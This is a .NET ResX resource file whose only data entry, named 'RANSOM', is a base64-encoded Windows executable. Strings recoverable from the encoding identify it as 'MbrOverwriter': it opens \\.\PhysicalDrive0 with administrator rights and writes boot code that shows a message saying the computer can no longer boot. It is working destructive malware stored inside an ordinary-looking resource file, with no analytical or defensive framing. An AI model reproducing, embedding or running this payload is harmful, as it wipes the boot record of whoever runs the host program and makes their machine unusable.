<?xml version="1.0" encoding="utf-8"?>
<root>
  <!-- 
    Microsoft ResX Schema 
    
    Version 2.0
    
    The primary goals of this format is to allow a simple XML format 
    that is mostly human readable. The generation and parsing of the 
    various data types are done through the TypeConverter classes 
    associated with the data types.
    
    Example:
    
    ... ado.net/XML headers & schema ...
    <resheader name="resmimetype">text/microsoft-resx</resheader>
    <resheader name="version">2.0</resheader>
    <resheader name="reader">System.Resources.ResXResourceReader, System.Windows.Forms, ...</resheader>
    <resheader name="writer">System.Resources.ResXResourceWriter, System.Windows.Forms, ...</resheader>
    <data name="Name1"><value>this is my long string</value><comment>this is a comment</comment></data>
    <data name="Color1" type="System.Drawing.Color, System.Drawing">Blue</data>
    <data name="Bitmap1" mimetype="application/x-microsoft.net.object.binary.base64">
        <value>[base64 mime encoded serialized .NET Framework object]</value>
    </data>
    <data name="Icon1" type="System.Drawing.Icon, System.Drawing" mimetype="application/x-microsoft.net.object.bytearray.base64">
        <value>[base64 mime encoded string representing a byte array form of the .NET Framework object]</value>
        <comment>This is a comment</comment>
    </data>
                
    There are any number of "resheader" rows that contain simple 
    name/value pairs.
    
    Each data row contains a name, and value. The row also contains a 
    type or mimetype. Type corresponds to a .NET class that support 
    text/value conversion through the TypeConverter architecture. 
    Classes that don't support this are serialized and stored with the 
    mimetype set.
    
    The mimetype is used for serialized objects, and tells the 
    ResXResourceReader how to depersist the object. This is currently not 
    extensible. For a given mimetype the value must be set accordingly:
    
    Note - application/x-microsoft.net.object.binary.base64 is the format 
    that the ResXResourceWriter will generate, however the reader can 
    read any of the formats listed below.
    
    mimetype: application/x-microsoft.net.object.binary.base64
    value   : The object must be serialized with 
            : System.Runtime.Serialization.Formatters.Binary.BinaryFormatter
            : and then encoded with base64 encoding.
    
    mimetype: application/x-microsoft.net.object.soap.base64
    value   : The object must be serialized with 
            : System.Runtime.Serialization.Formatters.Soap.SoapFormatter
            : and then encoded with base64 encoding.

    mimetype: application/x-microsoft.net.object.bytearray.base64
    value   : The object must be serialized into a byte array 
            : using a System.ComponentModel.TypeConverter
            : and then encoded with base64 encoding.
    -->
  <xsd:schema id="root" xmlns="" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:msdata="urn:schemas-microsoft-com:xml-msdata">
    <xsd:import namespace="http://www.w3.org/XML/1998/namespace" />
    <xsd:element name="root" msdata:IsDataSet="true">
      <xsd:complexType>
        <xsd:choice maxOccurs="unbounded">
          <xsd:element name="metadata">
            <xsd:complexType>
              <xsd:sequence>
                <xsd:element name="value" type="xsd:string" minOccurs="0" />
              </xsd:sequence>
              <xsd:attribute name="name" use="required" type="xsd:string" />
              <xsd:attribute name="type" type="xsd:string" />
              <xsd:attribute name="mimetype" type="xsd:string" />
              <xsd:attribute ref="xml:space" />
            </xsd:complexType>
          </xsd:element>
          <xsd:element name="assembly">
            <xsd:complexType>
              <xsd:attribute name="alias" type="xsd:string" />
              <xsd:attribute name="name" type="xsd:string" />
            </xsd:complexType>
          </xsd:element>
          <xsd:element name="data">
            <xsd:complexType>
              <xsd:sequence>
                <xsd:element name="value" type="xsd:string" minOccurs="0" msdata:Ordinal="1" />
                <xsd:element name="comment" type="xsd:string" minOccurs="0" msdata:Ordinal="2" />
              </xsd:sequence>
              <xsd:attribute name="name" type="xsd:string" use="required" msdata:Ordinal="1" />
              <xsd:attribute name="type" type="xsd:string" msdata:Ordinal="3" />
              <xsd:attribute name="mimetype" type="xsd:string" msdata:Ordinal="4" />
              <xsd:attribute ref="xml:space" />
            </xsd:complexType>
          </xsd:element>
          <xsd:element name="resheader">
            <xsd:complexType>
              <xsd:sequence>
                <xsd:element name="value" type="xsd:string" minOccurs="0" msdata:Ordinal="1" />
              </xsd:sequence>
              <xsd:attribute name="name" type="xsd:string" use="required" />
            </xsd:complexType>
          </xsd:element>
        </xsd:choice>
      </xsd:complexType>
    </xsd:element>
  </xsd:schema>
  <resheader name="resmimetype">
    <value>text/microsoft-resx</value>
  </resheader>
  <resheader name="version">
    <value>2.0</value>
  </resheader>
  <resheader name="reader">
    <value>System.Resources.ResXResourceReader, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
  </resheader>
  <resheader name="writer">
    <value>System.Resources.ResXResourceWriter, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
  </resheader>
  <assembly alias="mscorlib" name="mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" />
  <data name="RANSOM" type="System.Byte[], mscorlib">
    <value>
        TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
        gAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0K
        JAAAAAAAAABQRQAATAEDAHlBiuAAAAAAAAAAAOAAIgALATAAAA4AAAAUAAAAAAAAkisAAAAgAAAAQAAA
        AABAAAAgAAAAAgAABAAAAAAAAAAGAAAAAAAAAACAAAAAAgAAAAAAAAIAYIUAABAAABAAAAAAEAAAEAAA
        AAAAABAAAAAAAAAAAAAAAD8rAABPAAAAAEAAACgQAAAAAAAAAAAAAAAAAAAAAAAAAGAAAAwAAACAKgAA
        OAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAACAAAAAAAAAAAAAAA
        CCAAAEgAAAAAAAAAAAAAAC50ZXh0AAAAmA0AAAAgAAAADgAAAAIAAAAAAAAAAAAAAAAAACAAAGAucnNy
        YwAAACgQAAAAQAAAABIAAAAQAAAAAAAAAAAAAAAAAABAAABALnJlbG9jAAAMAAAAAGAAAAACAAAAIgAA
        AAAAAAAAAAAAAAAAQAAAQgAAAAAAAAAAAAAAAAAAAABzKwAAAAAAAEgAAAACAAUArCAAANQJAAABAAAA
        AwAABgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABMwBwBQAAAA
        AQAAEQAgAAIAAI0TAAABJdAKAAAEKBAAAAoKcgEAAHAgAAAAEBl+EQAAChkWfhEAAAooAQAABgsHBiAA
        AgAAEgJ+EQAACigCAAAGJhUoEgAACgAqQlNKQgEAAQAAAAAADAAAAHY0LjAuMzAzMTkAAAAABQBsAAAA
        MAMAACN+AACcAwAAmAQAACNTdHJpbmdzAAAAADQIAAAoAAAAI1VTAFwIAAAQAAAAI0dVSUQAAABsCAAA
        aAEAACNCbG9iAAAAAAAAAAIAAAFXnQI0CQIAAAD6ATMAFgAAAQAAABgAAAAEAAAACgAAAAMAAAANAAAA
        EgAAAAkAAAAPAAAAAQAAAAEAAAABAAAAAgAAAAEAAAABAAAAAQAAAAEAAAAAAAgDAQAAAAAABgBpAvED
        BgDWAvEDBgCdAb8DDwARBAAABgDFAW4DBgBMAm4DBgAtAm4DBgC9Am4DBgCJAm4DBgCiAm4DBgDcAW4D
        BgCxAdIDBgCPAdIDBgAQAm4DBgD3ARsDBgBuBE0DBgB0AfEDBgAiAU0DBgADA00DBgBPBPEDBgCQBE0D
        BgDbAE0DBgC4A00DBgB6BE0DAAAAAHAAAAAAAAEAAQCBARAAAQCkA0EAAQABAAABAAB5AAAAQQAKAAQA
        EwEAAAgAAABJAAsABABRgKgAYgBRgEIBYgBRgPQCYgBRgEIDYgBRgLQAYgBRgE8BYgBRgDUDYgBRgCwB
        YgBRgBMDYgAzAS8AZQAAAAAAgACRIO4AaQABAAAAAACAAJEgBwF0AAgAUCAAAAAAlgBpA38ADQAAAAEA
        FwEAAAIAXgQAAAMAzwAAAAQANQQAAAUAgAMAAAYAIAQAAAcA+QAAAAEAEQEAAAIAmwMAAAMAXgECAAQA
        VAMAAAUAwgAAAAEASgQJALIDAQARALIDBgAZALIDCgApALIDEAAxALIDEAA5ALIDEABBALIDEABJALID
        EABRALIDEABZALIDEABhALIDFQBpALIDEABxALIDEAB5ALIDEACJALIDBgChAIYEIQC5AJYDKQDBAHUE
        LAAJAAQAOgAJAAgAPwAJAAwARAAJABAASQAJABQATgAJABgAUwAJABwAWAAJACAAPwAJACQAXQAuAAsA
        hQAuABMAjgAuABsArQAuACMAtgAuACsAyQAuADMAyQAuADsAyQAuAEMAtgAuAEsAzwAuAFMAyQAuAFsA
        yQAuAGMA5wAuAGsAEQEuAHMAHgFjAHsATgABAAACAAAEABoAJgAAAQMA7gABAAABBQAHAQEAmCsAAAoA
        BIAAAAEAAAAAAAAAAAAAAAAAmAAAAAQAAAAAAAAAAAAAADEAnwAAAAAABAADAAAAAENsYXNzMQBfX1N0
        YXRpY0FycmF5SW5pdFR5cGVTaXplPTUxMgBrZXJuZWwzMgBDQzYzMDlBMzQwMDRDOTlCMkJEQkUxMzhG
        NERBOEUyMkM1NTEyQUE4NkM5RUYzMUY3Q0M0NkZCODQzQjk3NUI5ADxNb2R1bGU+ADxQcml2YXRlSW1w
        bGVtZW50YXRpb25EZXRhaWxzPgBSQU5TT00AbXNjb3JsaWIAR2VuZXJpY1JlYWQARmlsZVNoYXJlUmVh
        ZABscE92ZXJsYXBwZWQAZHdTaGFyZU1vZGUAUnVudGltZUZpZWxkSGFuZGxlAENyZWF0ZUZpbGUAaFRl
        bXBsYXRlRmlsZQBXcml0ZUZpbGUAaGZpbGUAbHBGaWxlTmFtZQBWYWx1ZVR5cGUARmlsZUZsYWdEZWxl
        dGVPbkNsb3NlAEdlbmVyaWNXcml0ZQBGaWxlU2hhcmVXcml0ZQBuTnVtYmVyT2ZCeXRlc1RvV3JpdGUA
        Q29tcGlsZXJHZW5lcmF0ZWRBdHRyaWJ1dGUAR3VpZEF0dHJpYnV0ZQBEZWJ1Z2dhYmxlQXR0cmlidXRl
        AENvbVZpc2libGVBdHRyaWJ1dGUAQXNzZW1ibHlUaXRsZUF0dHJpYnV0ZQBBc3NlbWJseVRyYWRlbWFy
        a0F0dHJpYnV0ZQBUYXJnZXRGcmFtZXdvcmtBdHRyaWJ1dGUAQXNzZW1ibHlGaWxlVmVyc2lvbkF0dHJp
        YnV0ZQBBc3NlbWJseUNvbmZpZ3VyYXRpb25BdHRyaWJ1dGUAQXNzZW1ibHlEZXNjcmlwdGlvbkF0dHJp
        YnV0ZQBDb21waWxhdGlvblJlbGF4YXRpb25zQXR0cmlidXRlAEFzc2VtYmx5UHJvZHVjdEF0dHJpYnV0
        ZQBBc3NlbWJseUNvcHlyaWdodEF0dHJpYnV0ZQBBc3NlbWJseUNvbXBhbnlBdHRyaWJ1dGUAUnVudGlt
        ZUNvbXBhdGliaWxpdHlBdHRyaWJ1dGUAR2VuZXJpY0V4ZWN1dGUAQnl0ZQBSQU5TT00uZXhlAE1iclNp
        emUAU3lzdGVtLlJ1bnRpbWUuVmVyc2lvbmluZwBPcGVuRXhpc3RpbmcAR2VuZXJpY0FsbABTeXN0ZW0A
        bHBOdW1iZXJCeXRlc1dyaXR0ZW4ATWFpbgBTeXN0ZW0uUmVmbGVjdGlvbgBkd0NyZWF0aW9uRGlzcG9z
        aXRpb24AWmVybwBscEJ1ZmZlcgBNYnJPdmVyd3JpdGVyAC5jdG9yAEludFB0cgBTeXN0ZW0uRGlhZ25v
        c3RpY3MAU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzAFN5c3RlbS5SdW50aW1lLkNvbXBpbGVy
        U2VydmljZXMARGVidWdnaW5nTW9kZXMAZHdGbGFnc0FuZEF0dHJpYnV0ZXMAbHBTZWN1cml0eUF0dHJp
        YnV0ZXMAYXJncwBSdW50aW1lSGVscGVycwBkd0Rlc2lyZWRBY2Nlc3MAT2JqZWN0AEV4aXQARW52aXJv
        bm1lbnQASW5pdGlhbGl6ZUFycmF5AAAAACVcAFwALgBcAFAAaAB5AHMAaQBjAGEAbABEAHIAaQB2AGUA
        MAAAAIMMd5rxh8NGnm1JWRZCFQIABCABAQgDIAABBSABARERBCABAQ4EIAEBAgYHAx0FGAkHAAIBElUR
        WQIGGAQAAQEICLd6XFYZNOCJBAAAAIAEAAAAQAQAAAAgBAAAABAEAQAAAAQCAAAABAMAAAAEAAIAAAIG
        CQMGERAKAAcYDgkJGAkJGAoABQIYHQUJEAkYBQABAR0OCAEACAAAAAAAHgEAAQBUAhZXcmFwTm9uRXhj
        ZXB0aW9uVGhyb3dzAQgBAAcBAAAAABIBAA1NYnJPdmVyd3JpdGVyAAAFAQAAAAAXAQASQ29weXJpZ2h0
        IMKpICAyMDIxAAApAQAkMWFmNDBmNjEtNDEwZC00ZGYzLTk1ZmYtYWU5ZWEyNzNhNWY1AAAMAQAHMS4w
        LjAuMAAASQEAGi5ORVRGcmFtZXdvcmssVmVyc2lvbj12NC44AQBUDhRGcmFtZXdvcmtEaXNwbGF5TmFt
        ZRIuTkVUIEZyYW1ld29yayA0LjgAAAAALE4E4wAAAAACAAAAhwAAALgqAAC4DAAAAAAAAAAAAAAAAAAA
        EAAAAAAAAAAAAAAAAAAAAFJTRFNN5n3FtLA8Trw/EQx12hdBAQAAAEU6XE1CUl9PVkVSV1JJVEVSX1NP
        VVJDRV9DT0RFLW1haW5cTUJSX09WRVJXUklURVJfU09VUkNFX0NPREVcTWJyT3ZlcndyaXRlclxNYnJP
        dmVyd3JpdGVyXG9ialxEZWJ1Z1xSQU5TT00ucGRiAGcrAAAAAAAAAAAAAIErAAAAIAAAAAAAAAAAAAAA
        AAAAAAAAAAAAAABzKwAAAAAAAAAAAAAAAF9Db3JFeGVNYWluAG1zY29yZWUuZGxsAAAAAAAA/yUAIEAA
        6wAxwI7Y/LgSAM0QviR8swToAgDr/rcArDwAdAa0Ds0Q6/XDT3ZlcndyaXR0ZW4gTUJSIG1lc3NhZ2U6
        IA0KSUYgeW91IGFyZSBsb29raW5nIGF0IHRoaXMgbWVzc2FnZSwgdGhlbiB5b3UgbXVzdCBoYXZlIG1p
        c3JlYWQgdGhlIHN0ZXBzLg0KTm93IHRoZXJlIGlzIG5vIHdheSBmb3IgeW91IHRvIGJvb3QgaW50byB5
        b3VyIGNvbXB1dGVyLg0KDQpZb3UgbXVzdCBpbnN0YWxsIGEgbmV3IGZyZXNoIGNvcHkgb2Ygd2luZG93
        cywgb3IgYnkgcmVwYWlyaW5nIHRoZSBNQlIuAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAVaoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAQAAAAIAAAgBgAAABQAACAAAAAAAAAAAAAAAAA
        AAABAAEAAAA4AACAAAAAAAAAAAAAAAAAAAABAAAAAACAAAAAAAAAAAAAAAAAAAAAAAABAAEAAABoAACA
        AAAAAAAAAAAAAAAAAAABAAAAAAC0AwAAkEAAACQDAAAAAAAAAAAAACQDNAAAAFYAUwBfAFYARQBSAFMA
        SQBPAE4AXwBJAE4ARgBPAAAAAAC9BO/+AAABAAAAAQAAAAAAAAABAAAAAAA/AAAAAAAAAAQAAAABAAAA
        AAAAAAAAAAAAAAAARAAAAAEAVgBhAHIARgBpAGwAZQBJAG4AZgBvAAAAAAAkAAQAAABUAHIAYQBuAHMA
        bABhAHQAaQBvAG4AAAAAAAAAsASEAgAAAQBTAHQAcgBpAG4AZwBGAGkAbABlAEkAbgBmAG8AAABgAgAA
        AQAwADAAMAAwADAANABiADAAAAAaAAEAAQBDAG8AbQBtAGUAbgB0AHMAAAAAAAAAIgABAAEAQwBvAG0A
        cABhAG4AeQBOAGEAbQBlAAAAAAAAAAAARAAOAAEARgBpAGwAZQBEAGUAcwBjAHIAaQBwAHQAaQBvAG4A
        AAAAAE0AYgByAE8AdgBlAHIAdwByAGkAdABlAHIAAAAwAAgAAQBGAGkAbABlAFYAZQByAHMAaQBvAG4A
        AAAAADEALgAwAC4AMAAuADAAAAA2AAsAAQBJAG4AdABlAHIAbgBhAGwATgBhAG0AZQAAAFIAQQBOAFMA
        TwBNAC4AZQB4AGUAAAAAAEgAEgABAEwAZQBnAGEAbABDAG8AcAB5AHIAaQBnAGgAdAAAAEMAbwBwAHkA
        cgBpAGcAaAB0ACAAqQAgACAAMgAwADIAMQAAACoAAQABAEwAZQBnAGEAbABUAHIAYQBkAGUAbQBhAHIA
        awBzAAAAAAAAAAAAPgALAAEATwByAGkAZwBpAG4AYQBsAEYAaQBsAGUAbgBhAG0AZQAAAFIAQQBOAFMA
        TwBNAC4AZQB4AGUAAAAAADwADgABAFAAcgBvAGQAdQBjAHQATgBhAG0AZQAAAAAATQBiAHIATwB2AGUA
        cgB3AHIAaQB0AGUAcgAAADQACAABAFAAcgBvAGQAdQBjAHQAVgBlAHIAcwBpAG8AbgAAADEALgAwAC4A
        MAAuADAAAAA4AAgAAQBBAHMAcwBlAG0AYgBsAHkAIABWAGUAcgBzAGkAbwBuAAAAMQAuADAALgAwAC4A
        MAAAAMRDAABgDAAAAAAAAAAAAADvu788P3htbCB2ZXJzaW9uPSIxLjAiIGVuY29kaW5nPSJ1dGYtOCI/
        Pg0KPGFzc2VtYmx5IG1hbmlmZXN0VmVyc2lvbj0iMS4wIiB4bWxucz0idXJuOnNjaGVtYXMtbWljcm9z
        b2Z0LWNvbTphc20udjEiPg0KICA8YXNzZW1ibHlJZGVudGl0eSB2ZXJzaW9uPSIxLjAuMC4wIiBuYW1l
        PSJNeUFwcGxpY2F0aW9uLmFwcCIvPg0KICA8dHJ1c3RJbmZvIHhtbG5zPSJ1cm46c2NoZW1hcy1taWNy
        b3NvZnQtY29tOmFzbS52MiI+DQogICAgPHNlY3VyaXR5Pg0KICAgICAgPHJlcXVlc3RlZFByaXZpbGVn
        ZXMgeG1sbnM9InVybjpzY2hlbWFzLW1pY3Jvc29mdC1jb206YXNtLnYzIj4NCiAgICAgICAgPCEtLSBV
        QUMgTWFuaWZlc3QgT3B0aW9ucw0KICAgICAgICAgICAgIElmIHlvdSB3YW50IHRvIGNoYW5nZSB0aGUg
        V2luZG93cyBVc2VyIEFjY291bnQgQ29udHJvbCBsZXZlbCByZXBsYWNlIHRoZSANCiAgICAgICAgICAg
        ICByZXF1ZXN0ZWRFeGVjdXRpb25MZXZlbCBub2RlIHdpdGggb25lIG9mIHRoZSBmb2xsb3dpbmcuDQoN
        CiAgICAgICAgPHJlcXVlc3RlZEV4ZWN1dGlvbkxldmVsICBsZXZlbD0iYXNJbnZva2VyIiB1aUFjY2Vz
        cz0iZmFsc2UiIC8+DQogICAgICAgIDxyZXF1ZXN0ZWRFeGVjdXRpb25MZXZlbCAgbGV2ZWw9InJlcXVp
        cmVBZG1pbmlzdHJhdG9yIiB1aUFjY2Vzcz0iZmFsc2UiIC8+DQogICAgICAgIDxyZXF1ZXN0ZWRFeGVj
        dXRpb25MZXZlbCAgbGV2ZWw9ImhpZ2hlc3RBdmFpbGFibGUiIHVpQWNjZXNzPSJmYWxzZSIgLz4NCg0K
        ICAgICAgICAgICAgU3BlY2lmeWluZyByZXF1ZXN0ZWRFeGVjdXRpb25MZXZlbCBlbGVtZW50IHdpbGwg
        ZGlzYWJsZSBmaWxlIGFuZCByZWdpc3RyeSB2aXJ0dWFsaXphdGlvbi4gDQogICAgICAgICAgICBSZW1v
        dmUgdGhpcyBlbGVtZW50IGlmIHlvdXIgYXBwbGljYXRpb24gcmVxdWlyZXMgdGhpcyB2aXJ0dWFsaXph
        dGlvbiBmb3IgYmFja3dhcmRzDQogICAgICAgICAgICBjb21wYXRpYmlsaXR5Lg0KICAgICAgICAtLT4N
        CiAgICAgICAgPHJlcXVlc3RlZEV4ZWN1dGlvbkxldmVsIGxldmVsPSJyZXF1aXJlQWRtaW5pc3RyYXRv
        ciIgdWlBY2Nlc3M9ImZhbHNlIiAvPg0KICAgICAgPC9yZXF1ZXN0ZWRQcml2aWxlZ2VzPg0KICAgIDwv
        c2VjdXJpdHk+DQogIDwvdHJ1c3RJbmZvPg0KDQogIDxjb21wYXRpYmlsaXR5IHhtbG5zPSJ1cm46c2No
        ZW1hcy1taWNyb3NvZnQtY29tOmNvbXBhdGliaWxpdHkudjEiPg0KICAgIDxhcHBsaWNhdGlvbj4NCiAg
        ICAgIDwhLS0gQSBsaXN0IG9mIHRoZSBXaW5kb3dzIHZlcnNpb25zIHRoYXQgdGhpcyBhcHBsaWNhdGlv
        biBoYXMgYmVlbiB0ZXN0ZWQgb24NCiAgICAgICAgICAgYW5kIGlzIGRlc2lnbmVkIHRvIHdvcmsgd2l0
        aC4gVW5jb21tZW50IHRoZSBhcHByb3ByaWF0ZSBlbGVtZW50cw0KICAgICAgICAgICBhbmQgV2luZG93
        cyB3aWxsIGF1dG9tYXRpY2FsbHkgc2VsZWN0IHRoZSBtb3N0IGNvbXBhdGlibGUgZW52aXJvbm1lbnQu
        IC0tPg0KDQogICAgICA8IS0tIFdpbmRvd3MgVmlzdGEgLS0+DQogICAgICA8IS0tPHN1cHBvcnRlZE9T
        IElkPSJ7ZTIwMTE0NTctMTU0Ni00M2M1LWE1ZmUtMDA4ZGVlZTNkM2YwfSIgLz4tLT4NCg0KICAgICAg
        PCEtLSBXaW5kb3dzIDcgLS0+DQogICAgICA8IS0tPHN1cHBvcnRlZE9TIElkPSJ7MzUxMzhiOWEtNWQ5
        Ni00ZmJkLThlMmQtYTI0NDAyMjVmOTNhfSIgLz4tLT4NCg0KICAgICAgPCEtLSBXaW5kb3dzIDggLS0+
        DQogICAgICA8IS0tPHN1cHBvcnRlZE9TIElkPSJ7NGEyZjI4ZTMtNTNiOS00NDQxLWJhOWMtZDY5ZDRh
        NGE2ZTM4fSIgLz4tLT4NCg0KICAgICAgPCEtLSBXaW5kb3dzIDguMSAtLT4NCiAgICAgIDwhLS08c3Vw
        cG9ydGVkT1MgSWQ9InsxZjY3NmM3Ni04MGUxLTQyMzktOTViYi04M2QwZjZkMGRhNzh9IiAvPi0tPg0K
        DQogICAgICA8IS0tIFdpbmRvd3MgMTAgLS0+DQogICAgICA8IS0tPHN1cHBvcnRlZE9TIElkPSJ7OGUw
        ZjdhMTItYmZiMy00ZmU4LWI5YTUtNDhmZDUwYTE1YTlhfSIgLz4tLT4NCg0KICAgIDwvYXBwbGljYXRp
        b24+DQogIDwvY29tcGF0aWJpbGl0eT4NCg0KICA8IS0tIEluZGljYXRlcyB0aGF0IHRoZSBhcHBsaWNh
        dGlvbiBpcyBEUEktYXdhcmUgYW5kIHdpbGwgbm90IGJlIGF1dG9tYXRpY2FsbHkgc2NhbGVkIGJ5IFdp
        bmRvd3MgYXQgaGlnaGVyDQogICAgICAgRFBJcy4gV2luZG93cyBQcmVzZW50YXRpb24gRm91bmRhdGlv
        biAoV1BGKSBhcHBsaWNhdGlvbnMgYXJlIGF1dG9tYXRpY2FsbHkgRFBJLWF3YXJlIGFuZCBkbyBub3Qg
        bmVlZCANCiAgICAgICB0byBvcHQgaW4uIFdpbmRvd3MgRm9ybXMgYXBwbGljYXRpb25zIHRhcmdldGlu
        ZyAuTkVUIEZyYW1ld29yayA0LjYgdGhhdCBvcHQgaW50byB0aGlzIHNldHRpbmcsIHNob3VsZCANCiAg
        ICAgICBhbHNvIHNldCB0aGUgJ0VuYWJsZVdpbmRvd3NGb3Jtc0hpZ2hEcGlBdXRvUmVzaXppbmcnIHNl
        dHRpbmcgdG8gJ3RydWUnIGluIHRoZWlyIGFwcC5jb25maWcuIC0tPg0KICA8IS0tDQogIDxhcHBsaWNh
        dGlvbiB4bWxucz0idXJuOnNjaGVtYXMtbWljcm9zb2Z0LWNvbTphc20udjMiPg0KICAgIDx3aW5kb3dz
        U2V0dGluZ3M+DQogICAgICA8ZHBpQXdhcmUgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5j
        b20vU01JLzIwMDUvV2luZG93c1NldHRpbmdzIj50cnVlPC9kcGlBd2FyZT4NCiAgICA8L3dpbmRvd3NT
        ZXR0aW5ncz4NCiAgPC9hcHBsaWNhdGlvbj4NCiAgLS0+DQoNCiAgPCEtLSBFbmFibGUgdGhlbWVzIGZv
        ciBXaW5kb3dzIGNvbW1vbiBjb250cm9scyBhbmQgZGlhbG9ncyAoV2luZG93cyBYUCBhbmQgbGF0ZXIp
        IC0tPg0KICA8IS0tDQogIDxkZXBlbmRlbmN5Pg0KICAgIDxkZXBlbmRlbnRBc3NlbWJseT4NCiAgICAg
        IDxhc3NlbWJseUlkZW50aXR5DQogICAgICAgICAgdHlwZT0id2luMzIiDQogICAgICAgICAgbmFtZT0i
        TWljcm9zb2Z0LldpbmRvd3MuQ29tbW9uLUNvbnRyb2xzIg0KICAgICAgICAgIHZlcnNpb249IjYuMC4w
        LjAiDQogICAgICAgICAgcHJvY2Vzc29yQXJjaGl0ZWN0dXJlPSIqIg0KICAgICAgICAgIHB1YmxpY0tl
        eVRva2VuPSI2NTk1YjY0MTQ0Y2NmMWRmIg0KICAgICAgICAgIGxhbmd1YWdlPSIqIg0KICAgICAgICAv
        Pg0KICAgIDwvZGVwZW5kZW50QXNzZW1ibHk+DQogIDwvZGVwZW5kZW5jeT4NCiAgLS0+DQoNCjwvYXNz
        ZW1ibHk+DQoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
        AAAAAAAgAAAMAAAAlDsAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
</value>
  </data>
</root>